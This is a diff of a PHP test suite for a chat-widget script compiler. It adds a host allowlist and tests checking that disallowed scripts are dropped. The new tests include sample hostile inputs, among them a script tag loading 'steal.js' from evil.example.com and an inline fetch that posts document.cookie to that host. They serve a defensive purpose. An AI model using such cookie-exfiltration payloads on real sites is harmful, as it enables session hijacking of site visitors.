@@ -45,6 +45,8 @@ HTML,
 <script>(function(d,t){var BASE_URL="https://chat.example.com";var g=d.createElement(t);g.src=BASE_URL+"/packs/js/sdk.js";g.onload=function(){window.chatwootSDK.run({websiteToken:"token",baseUrl:BASE_URL})};d.head.appendChild(g)})(document,"script");</script>
 HTML,
             ],
+            // 自建 Chatwoot 域名需显式加入白名单(安全审计 M2)。
+            'service_widget_allowed_hosts' => ['chat.example.com', 'client.crisp.chat'],
         ]);
 
         $response = $this->get('/')->assertOk();
@@ -61,11 +63,41 @@ HTML,
             'enabled' => true,
             'script' => '<script src="https://cdn.example.com/widget.js" async></script>'
                 .'<script src="javascript:alert(1)"></script>',
-        ]);
+        ], ['cdn.example.com']);
 
         $this->assertStringContainsString('https://cdn.example.com/widget.js', $compiled);
         $this->assertStringContainsString('s.async=true', $compiled);
         $this->assertStringNotContainsString('javascript:', $compiled);
+    }
+
+    public function test_external_script_src_outside_allowlist_is_dropped(): void
+    {
+        $compiled = ServiceWidgetScript::compile([
+            'enabled' => true,
+            'script' => '<script src="https://evil.example.com/steal.js"></script>',
+        ]);
+
+        $this->assertSame('', $compiled);
+    }
+
+    public function test_inline_body_referencing_disallowed_host_is_dropped(): void
+    {
+        $compiled = ServiceWidgetScript::compile([
+            'enabled' => true,
+            'script' => '<script>fetch("https://evil.example.com/x",{method:"POST",body:document.cookie})</script>',
+        ]);
+
+        $this->assertSame('', $compiled);
+    }
+
+    public function test_inline_body_with_http_url_is_dropped(): void
+    {
+        $compiled = ServiceWidgetScript::compile([
+            'enabled' => true,
+            'script' => '<script>var s=document.createElement("script");s.src="http://insecure.example.com/a.js"</script>',
+        ], ['insecure.example.com']);
+
+        $this->assertSame('', $compiled);
     }
 
     public function test_disabled_widget_returns_empty_script_and_does_not_relax_csp(): void
